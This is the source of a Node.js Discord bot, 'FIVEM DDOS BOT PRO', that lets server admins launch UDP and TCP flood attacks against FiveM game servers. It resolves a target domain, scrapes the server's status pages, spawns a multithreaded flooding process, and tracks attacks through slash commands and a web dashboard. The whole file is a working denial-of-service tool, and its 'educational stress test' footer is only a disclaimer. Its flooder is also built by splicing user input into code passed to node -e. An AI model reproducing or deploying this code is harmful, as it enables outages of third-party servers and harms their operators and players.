// ===================================================================
// FIVEM DDOS BOT PRO – DOMAIN RESOLUTION + LIVE STATUS + CMD UI
// ===================================================================
require('dotenv').config();
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
const { spawn } = require('child_process');
const net = require('net');
const dgram = require('dgram');
const dns = require('dns').promises;
const fetch = require('node-fetch');
const express = require('express');
const http = require('http');

// ---------- GLOBALS ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

let activeAttacks = new Map(); // key: guildId-userId, value: { process, target, port, duration, startTime, threads, packetSize, resolvedIP, domain }
let attackCounter = 0;
const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
const OWNER = process.env.OWNER_ID;
const spinner = ['|', '/', '-', '\\'];

// ---------- UTILITY FUNCTIONS ----------
function generatePayload(size) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let payload = '';
  for (let i = 0; i < size; i++) {
    payload += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return payload;
}

function isValidIP(ip) {
  const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return ipv4Regex.test(ip);
}

async function resolveDomainToIP(host) {
  try {
    // First try native DNS
    const result = await dns.lookup(host);
    if (result && result.address) return result.address;
  } catch (e) {
    // Fallback to Cloudflare DNS-over-HTTPS
    try {
      const response = await fetch(`https://cloudflare-dns.com/dns-query?name=${host}&type=A`, {
        headers: { 'Accept': 'application/dns-json' }
      });
      const data = await response.json();
      if (data.Answer && data.Answer.length > 0) {
        const ipRecord = data.Answer.find(rec => rec.type === 1);
        if (ipRecord) return ipRecord.data;
      }
    } catch (e2) {
      // Last resort: use nslookup via child_process
      return new Promise((resolve) => {
        const nslookup = spawn('nslookup', [host]);
        let output = '';
        nslookup.stdout.on('data', (data) => { output += data.toString(); });
        nslookup.on('close', () => {
          const match = output.match(/Address:\s*(\d+\.\d+\.\d+\.\d+)/);
          if (match && match[1]) resolve(match[1]);
          else resolve(null);
        });
      });
    }
  }
  return null;
}

async function fetchServerDetails(ip, port) {
  try {
    const infoUrl = `http://${ip}:${port}/info.json`;
    const playersUrl = `http://${ip}:${port}/players.json`;
    
    const [infoRes, playersRes] = await Promise.all([
      fetch(infoUrl, { timeout: 3000 }),
      fetch(playersUrl, { timeout: 3000 })
    ]);

    if (!infoRes.ok || !playersRes.ok) {
      throw new Error('Server not responding');
    }

    const info = await infoRes.json();
    const players = await playersRes.json();

    // Calculate ping using TCP handshake
    const ping = await measurePing(ip, port);

    return {
      name: info.project || 'Unknown',
      gametype: info.gametype || 'Unknown',
      map: info.mapname || 'Unknown',
      players: Array.isArray(players) ? players.length : 0,
      maxPlayers: info.players ? info.players.length : 0,
      ping: ping,
      uptime: info.uptime ? formatUptime(info.uptime) : 'N/A'
    };
  } catch (err) {
    return null;
  }
}

function measurePing(ip, port) {
  return new Promise((resolve) => {
    const start = Date.now();
    const socket = new net.Socket();
    socket.setTimeout(2000);
    socket.connect(port, ip, () => {
      const latency = Date.now() - start;
      socket.destroy();
      resolve(latency);
    });
    socket.on('error', () => {
      socket.destroy();
      resolve('N/A');
    });
    socket.on('timeout', () => {
      socket.destroy();
      resolve('N/A');
    });
  });
}

function formatUptime(seconds) {
  const days = Math.floor(seconds / 86400);
  const hours = Math.floor((seconds % 86400) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  return `${days}d ${hours}h ${minutes}m`;
}

// ---------- FLOOD ENGINE (Enhanced) ----------
function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 10) {
  return new Promise((resolve, reject) => {
    const flooder = spawn('node', [
      '-e',
      `
        const net = require('net');
        const dgram = require('dgram');
        const target = '${targetIP}';
        const port = ${targetPort};
        const duration = ${durationSeconds} * 1000;
        const size = ${packetSize};
        const threads = ${threads};

        function generatePayload(s) {
          let p = '';
          for (let i=0; i<s; i++) p += String.fromCharCode(33 + Math.floor(Math.random()*94));
          return p;
        }

        function udpFlood() {
          const sock = dgram.createSocket('udp4');
          const payload = generatePayload(size);
          let start = Date.now();
          let sent = 0;
          while (Date.now() - start < duration) {
            sock.send(payload, 0, payload.length, port, target, (err) => {
              if (err) { /* silent fail */ }
              sent++;
            });
            if (sent % 1000 === 0) {
              setImmediate(() => {});
            }
          }
          sock.close();
        }

        function tcpFlood() {
          const payload = generatePayload(size);
          let start = Date.now();
          let connections = 0;
          while (Date.now() - start < duration) {
            const client = new net.Socket();
            client.connect(port, target, () => {
              client.write(payload);
              connections++;
            });
            client.on('error', () => { /* ignore */ });
            setTimeout(() => { client.destroy(); }, 100);
            if (connections % 500 === 0) setImmediate(() => {});
          }
        }

        for (let i = 0; i < threads; i++) {
          if (i % 2 === 0) {
            setTimeout(udpFlood, i * 10);
          } else {
            setTimeout(tcpFlood, i * 10);
          }
        }

        setTimeout(() => {
          process.exit(0);
        }, duration + 5000);
      `
    ], { stdio: ['ignore', 'pipe', 'pipe'] });

    let output = '';
    flooder.stdout.on('data', (data) => { output += data.toString(); });
    flooder.stderr.on('data', (data) => { output += data.toString(); });

    flooder.on('close', (code) => {
      resolve({ code, output });
    });

    flooder.on('error', (err) => {
      reject(err);
    });

    return flooder;
  });
}

// ---------- DISCORD BOT LOGIC ----------
client.once('ready', async () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  await registerCommands();
  console.log('✅ Slash commands registered');
});

async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('attack')
      .setDescription('Launch DDoS attack on IP or domain (e.g., fivem.example.com:30120)')
      .addStringOption(option =>
        option.setName('target')
          .setDescription('Target IP:Port or Domain:Port (e.g., 192.168.1.1:30120 or fivem.example.com:30120)')
          .setRequired(true)
      )
      .addIntegerOption(option =>
        option.setName('duration')
          .setDescription('Duration in seconds (default: 60)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('packetsize')
          .setDescription('Packet size in bytes (default: 1024)')
          .setRequired(false)
      )
      .addIntegerOption(option =>
        option.setName('threads')
          .setDescription('Number of threads (default: 10, max: 50)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('stop')
      .setDescription('Stop your active attack'),
    new SlashCommandBuilder()
      .setName('status')
      .setDescription('Show all active attacks with details'),
    new SlashCommandBuilder()
      .setName('killall')
      .setDescription('[OWNER] Terminate all attacks')
  ];

  try {
    const guild = client.guilds.cache.get(process.env.GUILD_ID);
    if (guild) {
      await guild.commands.set(commands);
    } else {
      await client.application.commands.set(commands);
    }
  } catch (err) {
    console.error('Command registration failed:', err);
  }
}

// ---------- COMMAND HANDLERS ----------
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user, guild } = interaction;

  if (commandName === 'attack') {
    await interaction.deferReply({ ephemeral: true });

    const member = guild.members.cache.get(user.id);
    if (!member.permissions.has(PermissionsBitField.Flags.Administrator) && user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Insufficient permissions.', ephemeral: true });
    }

    const rawTarget = interaction.options.getString('target');
    const duration = interaction.options.getInteger('duration') || 60;
    const packetSize = interaction.options.getInteger('packetsize') || 1024;
    const threads = Math.min(interaction.options.getInteger('threads') || 10, 50);

    // Parse target: host:port
    let host, port = 30120;
    if (rawTarget.includes(':')) {
      const parts = rawTarget.split(':');
      host = parts[0];
      port = parseInt(parts[1]) || 30120;
    } else {
      host = rawTarget;
    }

    if (port < 1 || port > 65535) {
      return interaction.editReply({ content: '❌ Invalid port range.', ephemeral: true });
    }

    // Resolve domain or validate IP
    let resolvedIP = host;
    if (!isValidIP(host)) {
      // Show loading animation
      let loadingMsg = await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[0]}`, ephemeral: true });
      let spinIdx = 0;
      const interval = setInterval(async () => {
        spinIdx = (spinIdx + 1) % spinner.length;
        await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[spinIdx]}`, ephemeral: true });
      }, 2000);

      resolvedIP = await resolveDomainToIP(host);
      clearInterval(interval);

      if (!resolvedIP) {
        return interaction.editReply({ content: `❌ Could not resolve domain \`${host}\`.`, ephemeral: true });
      }
      await interaction.editReply({ content: `✅ Resolved \`${host}\` → \`${resolvedIP}\``, ephemeral: true });
    }

    // Fetch server details
    await interaction.editReply({ content: `📡 Fetching server details for \`${resolvedIP}:${port}\`...`, ephemeral: true });
    const serverInfo = await fetchServerDetails(resolvedIP, port);

    let detailsBlock = '';
    if (serverInfo) {
      detailsBlock = `
\`\`\`
SERVER STATUS
─────────────────
Name     : ${serverInfo.name}
Gametype : ${serverInfo.gametype}
Map      : ${serverInfo.map}
Players  : ${serverInfo.players}/${serverInfo.maxPlayers}
Ping     : ${serverInfo.ping}ms
Uptime   : ${serverInfo.uptime}
─────────────────
\`\`\``;
    } else {
      detailsBlock = `\`\`\`\n⚠️ Server info unavailable – target may be offline or blocking requests.\n\`\`\``;
    }

    // Check for existing attack
    const attackKey = `${guild.id}-${user.id}`;
    if (activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: '⚠️ You already have an active attack. Use `/stop`.', ephemeral: true });
    }

    // Launch flooder
    try {
      const flooderProcess = await launchFlooder(resolvedIP, port, duration, packetSize, threads);
      
      activeAttacks.set(attackKey, {
        process: flooderProcess,
        target: rawTarget,
        resolvedIP: resolvedIP,
        port: port,
        duration: duration,
        startTime: Date.now(),
        threads: threads,
        packetSize: packetSize
      });

      attackCounter++;

      const embed = new EmbedBuilder()
        .setTitle('🔥 ATTACK LAUNCHED')
        .setColor(0xFF0000)
        .addFields(
          { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
          { name: 'Port', value: `${port}`, inline: true },
          { name: 'Duration', value: `${duration}s`, inline: true },
          { name: 'Threads', value: `${threads}`, inline: true },
          { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
          { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
          { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
        )
        .setDescription(detailsBlock)
        .setTimestamp()
        .setFooter({ text: 'Educational stress test – do not use illegally' });

      const logChannel = client.channels.cache.get(LOG_CHANNEL);
      if (logChannel) await logChannel.send({ embeds: [embed] });

      await interaction.editReply({
        content: `✅ Attack launched against **${rawTarget}** (${resolvedIP}:${port}) for **${duration}s** with **${threads}** threads.\nUse \`/stop\` to halt.`,
        ephemeral: true
      });

      // Auto-expire
      setTimeout(() => {
        if (activeAttacks.has(attackKey)) {
          activeAttacks.delete(attackKey);
          const doneEmbed = new EmbedBuilder()
            .setTitle('⏹️ ATTACK COMPLETED')
            .setColor(0x00FF00)
            .addFields(
              { name: 'Target', value: `${rawTarget}`, inline: true },
              { name: 'Duration', value: `${duration}s`, inline: true },
              { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
            )
            .setTimestamp();
          if (logChannel) logChannel.send({ embeds: [doneEmbed] });
        }
      }, duration * 1000 + 3000);

    } catch (err) {
      console.error(err);
      await interaction.editReply({ content: `❌ Attack failed: ${err.message}`, ephemeral: true });
    }
  }

  else if (commandName === 'stop') {
    await interaction.deferReply({ ephemeral: true });
    const attackKey = `${guild.id}-${user.id}`;
    if (!activeAttacks.has(attackKey)) {
      return interaction.editReply({ content: 'ℹ️ No active attack.', ephemeral: true });
    }
    const attack = activeAttacks.get(attackKey);
    try {
      attack.process.kill('SIGTERM');
      activeAttacks.delete(attackKey);
      await interaction.editReply({ content: `🛑 Stopped attack on \`${attack.target}\`.`, ephemeral: true });
    } catch (err) {
      await interaction.editReply({ content: `❌ Error: ${err.message}`, ephemeral: true });
    }
  }

  else if (commandName === 'status') {
    await interaction.deferReply({ ephemeral: true });
    if (activeAttacks.size === 0) {
      return interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
    }
    let table = '📊 **ACTIVE ATTACKS**\n```\n';
    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads\n';
    table += '----|-------------------------|------|---------|-----------|--------\n';
    let idx = 1;
    for (const [key, attack] of activeAttacks) {
      const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
      const remaining = Math.max(attack.duration - elapsed, 0);
      const targetStr = attack.target.length > 20 ? attack.target.substring(0, 17) + '...' : attack.target.padEnd(20);
      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(6)}\n`;
      idx++;
    }
    table += '```';
    await interaction.editReply({ content: table, ephemeral: true });
  }

  else if (commandName === 'killall') {
    await interaction.deferReply({ ephemeral: true });
    if (user.id !== OWNER) {
      return interaction.editReply({ content: '⛔ Owner only.', ephemeral: true });
    }
    const count = activeAttacks.size;
    for (const [key, attack] of activeAttacks) {
      try { attack.process.kill('SIGKILL'); } catch (e) {}
    }
    activeAttacks.clear();
    await interaction.editReply({ content: `☠️ Killed ${count} attacks.`, ephemeral: true });
  }
});

// ---------- EXPRESS WEB DASHBOARD ----------
const app = express();
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>DDoS Bot Status</title></head>
      <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;">
        <h1>⚡ ATTACK ENGINE STATUS</h1>
        <p>Active Attacks: ${activeAttacks.size}</p>
        <p>Total Launched: ${attackCounter}</p>
        <p>Uptime: ${process.uptime().toFixed(2)}s</p>
        <pre>${JSON.stringify(Array.from(activeAttacks.entries()).map(([k,v]) => ({ user: k, target: v.target, port: v.port, elapsed: Math.floor((Date.now()-v.startTime)/1000) })), null, 2)}</pre>
      </body>
    </html>
  `);
});
const server = http.createServer(app);
server.listen(process.env.PORT || 3000, () => {
  console.log(`🌐 Dashboard running on port ${process.env.PORT || 3000}`);
});

// ---------- ERROR HANDLING ----------
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));

// ---------- LOGIN ----------
client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('Login failed:', err);
  process.exit(1);
});
